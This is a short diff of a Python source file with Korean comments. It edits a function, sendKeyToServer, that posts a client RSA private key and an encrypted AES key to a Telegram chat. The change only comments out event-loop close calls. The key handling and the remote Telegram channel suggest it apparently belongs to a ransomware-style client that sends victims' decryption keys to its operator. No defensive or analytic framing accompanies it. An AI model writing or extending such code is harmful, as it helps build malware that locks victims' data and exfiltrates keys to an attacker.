@@ -91,20 +91,16 @@ def sendKeyToServer(encrypted_aes_key):
     print('[DEBUG] Sending key information to Server...')
     loop = asyncio.get_event_loop() # 이벤트 루프를 얻음
     loop.run_until_complete(sendTelegram(CHAT_ID, "ClientRSAPublicKey: ")) # 끝날 때까지 기다림
-    loop.close
+    #loop.close
     loop = asyncio.get_event_loop() 
     loop.run_until_complete(sendTelegram(CHAT_ID, str(PRIVATE_KEY_RSA._private_key))) 
-    loop.close
+    #loop.close
     loop = asyncio.get_event_loop()
     loop.run_until_complete(sendTelegram(CHAT_ID, "EncryptedClientAESKey: "))
-    loop.close
+    #loop.close
     loop = asyncio.get_event_loop()  
     loop.run_until_complete(sendTelegram(CHAT_ID, str(encrypted_aes_key)))
-    loop.close
-    #asyncio.run(sendTelegram(CHAT_ID, "ClientRSAPublicKey: "))
-    #asyncio.run(sendTelegram(CHAT_ID, str(PRIVATE_KEY_RSA._private_key)))
-    #asyncio.run(sendTelegram(CHAT_ID, "EncryptedClientAESKey: "))
-    #asyncio.run(sendTelegram(CHAT_ID, str(encrypted_aes_key)))
+    #loop.close
     print('[DEBUG] Complete Sending')
     
 if __name__=='__main__':
